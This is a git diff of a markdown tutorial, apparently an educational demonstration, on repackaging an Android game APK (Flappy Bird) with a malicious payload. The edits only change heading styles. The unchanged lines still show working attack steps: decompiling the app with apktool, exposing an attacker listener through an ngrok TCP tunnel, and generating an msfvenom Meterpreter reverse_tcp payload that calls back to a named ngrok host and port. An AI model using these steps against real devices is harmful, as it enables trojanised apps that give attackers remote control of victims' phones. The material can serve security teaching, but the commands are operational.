@@ -32,7 +32,7 @@ Before proceeding with the APK manipulation demonstration, it is essential to es
 
 For this demonstration, a Flappy Bird APK downloaded from APKpure.com was utilized as the target application. The decompilation process was carried out using APKTool, a reverse engineering tool for Android applications.
 
-**Command executed:**
+##### Command executed:
 
 ```apktool d FlappyBird.apk -o app_decoded```
 
@@ -52,7 +52,7 @@ For this demonstration, a Flappy Bird APK downloaded from APKpure.com was utiliz
 
 To establish a connection pathway from the victim device to mine attack infrastructure, I configured Ngrok to create a secure tunnel. Ngrok provides a public endpoint that forwards traffic to our local attack machine.
 
-Command executed:
+##### Command executed:
 
 ```ngrok tcp 4444```
 
@@ -74,8 +74,6 @@ This setup creates a bidirectional communication channel, where external traffic
 
 **NAT Traversal Capability**: This service enables the creation of virtual connections between two devices even when both have private IP addresses, effectively bypassing Network Address Translation (NAT) restrictions.
 
-Practical Example:
-
 In our demonstration, TCP traffic directed to the address ```6.tcp.eu.ngrok.io:16690``` is automatically transmitted by Ngrok to port 4444 of the attacker's computer, creating a seamless communication channel that bypasses typical network security barriers.
 
 ![ngrok map](ngrokmap.jpg)
@@ -87,11 +85,11 @@ In our demonstration, TCP traffic directed to the address ```6.tcp.eu.ngrok.io:1
 
 Using Metasploit's msfvenom tool, I generated a malicious Android payload configured to establish a reverse TCP connection to our Ngrok endpoint.
 
-**Command executed:**
+##### Command executed:
 
 ```msfvenom -p android/meterpreter/reverse_tcp LHOST=6.tcp.eu.ngrok.io LPORT=16690 -o payload.apk```
 
-**Payload decompilation:**
+###### Payload decompilation:
 
 ```apktool d payload.apk -o payload_decoded```
 
